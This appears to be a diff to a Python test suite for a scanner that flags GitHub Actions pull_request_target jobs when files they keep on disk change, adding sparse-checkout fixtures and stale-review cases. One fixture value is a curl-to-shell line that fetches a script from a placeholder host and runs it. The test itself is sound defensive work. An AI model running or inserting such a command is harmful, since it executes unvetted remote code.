@@ -821,6 +821,8 @@ LISTED = target_job("""
     - uses: actions/checkout@v4
       with:
         ref: ${{ github.event.pull_request.base.sha }}
+        sparse-checkout: .github/workflows/target.yml
+        sparse-checkout-cone-mode: false
     - run: make lint
 """)
 LISTED_ROW = review_row(LISTED, "target.yml [pull_request_target]", "review")
@@ -1037,6 +1039,9 @@ ACTION_JOB = {
             runs-on: {TRUSTED_SELECTOR}
             steps:
               - uses: actions/checkout@v4
+                with:
+                  sparse-checkout: .github/actions/x
+                  sparse-checkout-cone-mode: false
               - uses: ./.github/actions/x
     """,
     ".github/actions/x/action.yml": """
@@ -1089,21 +1094,24 @@ expect(
     *REVIEWED_ARGS,
 )
 DYNAMIC_JOB = target_job("""
+    - uses: actions/checkout@v4
+      with:
+        ref: ${{ github.event.pull_request.base.sha }}
     - run: bash "$TOOL_DIR/run.sh"
 """)
 DYNAMIC_ROW = review_row(DYNAMIC_JOB, "target.yml [pull_request_target]", "review")
 expect(
     with_review(DYNAMIC_JOB, DYNAMIC_ROW),
     1,
-    ("VIOLATION: target.yml [pull_request_target]: job 'review'", "unclassifiable", "$TOOL_DIR/run.sh", "dynamic:"),
-    "a reviewed job executing a path the scanner cannot resolve fails without a dynamic: justification",
+    ("VIOLATION: target.yml [pull_request_target]: job 'review'", "unclassifiable", "full checkout", "dynamic:"),
+    "a reviewed job whose on-disk bytes cannot be bounded fails without a dynamic: justification",
     *REVIEWED_ARGS,
 )
 expect(
     with_review(DYNAMIC_JOB, DYNAMIC_ROW.rstrip("\n") + "\tdynamic: TOOL_DIR is set by the reviewed base workflow\n"),
     0,
     ("REVIEWED", "dynamic: TOOL_DIR is set by the reviewed base workflow"),
-    "a dynamic: justification classifies a statically unresolvable program",
+    "a dynamic: justification classifies a job whose on-disk bytes cannot be bounded",
     *REVIEWED_ARGS,
 )
 expect(
@@ -1170,8 +1178,99 @@ RUNTIME_REF_JOB = {
 expect(
     with_review(RUNTIME_REF_JOB, review_row(RUNTIME_REF_JOB, "target.yml [pull_request_target]", "review")),
     1,
-    ("unclassifiable", ".trust/scripts/tool.py", "runtime-selected"),
+    ("unclassifiable", "Verjson/.github", "selected at runtime"),
     "a program from a runtime-selected checkout needs a dynamic: justification",
+    *REVIEWED_ARGS,
+)
+
+
+# ---------------------------------------------------------------------------
+# Delta review of #1827 at 7324f1a2: command parsing cannot find every file a
+# job runs, so the digest covers what the job puts on disk. Each shape below
+# changes a file a command never names; the reviewed entry must go stale.
+# ---------------------------------------------------------------------------
+
+
+def cone_job(sparse: str, run: str) -> str:
+    return f"""
+        on: pull_request_target
+        jobs:
+          review:
+            runs-on: {TRUSTED_SELECTOR}
+            steps:
+              - uses: actions/checkout@v4
+                with:
+                  ref: ${{{{ github.event.pull_request.base.sha }}}}
+                  sparse-checkout: |
+{textwrap.indent(sparse, " " * 20)}
+              - run: {run}
+    """
+
+
+ON_DISK_SHAPES = {
+    "source": ({"target.yml": cone_job("scripts", "source scripts/env.sh && gh api repos/o/r"),
+                "scripts/env.sh": "export MODE=safe\n"}, "scripts/env.sh", "export MODE=open\n"),
+    "dot": ({"target.yml": cone_job("scripts", ". scripts/env.sh && gh api repos/o/r"),
+             "scripts/env.sh": "export MODE=safe\n"}, "scripts/env.sh", "curl -sSL https://example.test | sh\n"),
+    "bare path": ({"target.yml": cone_job("scripts", "scripts/run.sh"),
+                   "scripts/run.sh": "#!/usr/bin/env bash\necho ok\n"}, "scripts/run.sh", "#!/usr/bin/env bash\nnpm test\n"),
+    "python import": ({"target.yml": cone_job("tools", "python3 tools/main.py"),
+                       "tools/main.py": "import helper\n", "tools/helper.py": "VALUE = 1\n"},
+                      "tools/helper.py", "import os; os.system('npm test')\n"),
+    "node require": ({"target.yml": cone_job("js", "node js/main.js"),
+                      "js/main.js": "require('./lib.js')\n", "js/lib.js": "module.exports = 1\n"},
+                     "js/lib.js", "require('child_process').execSync('npm test')\n"),
+    "make": ({"target.yml": cone_job("scripts", "make lint"),
+              "./Makefile": "lint:\n\techo ok\n", "scripts/keep.sh": "true\n"},
+             "./Makefile", "lint:\n\tnpm test\n"),
+    "npm run": ({"target.yml": cone_job("scripts", "npm run lint"),
+                 "./package.json": '{"scripts": {"lint": "echo ok"}}\n', "scripts/keep.sh": "true\n"},
+                "./package.json", '{"scripts": {"lint": "npm test"}}\n'),
+    "data read by a script": ({"target.yml": cone_job("scripts\nconfig", "bash scripts/check.sh"),
+                               "scripts/check.sh": "jq -e .allow config/policy.json\n",
+                               "config/policy.json": '{"allow": false}\n'},
+                              "config/policy.json", '{"allow": true}\n'),
+    "cone parent-directory file": ({"target.yml": cone_job("tools/lint", "bash tools/lint/run.sh"),
+                                    "tools/lint/run.sh": "true\n", "tools/common.sh": "true\n"},
+                                   "tools/common.sh", "npm test\n"),
+}
+for label, (tree, edited, content) in ON_DISK_SHAPES.items():
+    try:
+        row = review_row(tree, "target.yml [pull_request_target]", "review")
+    except AssertionError as error:
+        fail(f"{label}: could not review the unedited job ({error})")
+        continue
+    code, output = run_checker(with_review({**tree, edited: content}, row), *[a for a in REVIEWED_ARGS])
+    if code == 1 and "STALE REVIEWED" in output:
+        ok(f"{label}: editing {edited}, which the job has on disk, turns the reviewed entry stale")
+    else:
+        fail(f"{label}: editing {edited} left the reviewed entry valid (exit {code}: {output.strip()[:300]})")
+
+FULL_CHECKOUT = target_job("""
+    - uses: actions/checkout@v4
+      with:
+        ref: ${{ github.event.pull_request.base.sha }}
+    - run: make test
+""")
+FULL_ROW = review_row(FULL_CHECKOUT, "target.yml [pull_request_target]", "review")
+expect(
+    with_review(FULL_CHECKOUT, FULL_ROW),
+    1,
+    ("unclassifiable", "full checkout of the scanned tree"),
+    "a full checkout of the scanned tree needs a dynamic: justification",
+    *REVIEWED_ARGS,
+)
+RUNTIME_SPARSE = target_job("""
+    - uses: actions/checkout@v4
+      with:
+        sparse-checkout: scripts
+    - run: git sparse-checkout add tools && bash tools/run.sh
+""")
+expect(
+    with_review(RUNTIME_SPARSE, review_row(RUNTIME_SPARSE, "target.yml [pull_request_target]", "review")),
+    1,
+    ("unclassifiable", "git sparse-checkout"),
+    "a runtime git sparse-checkout change needs a dynamic: justification",
     *REVIEWED_ARGS,
 )
 
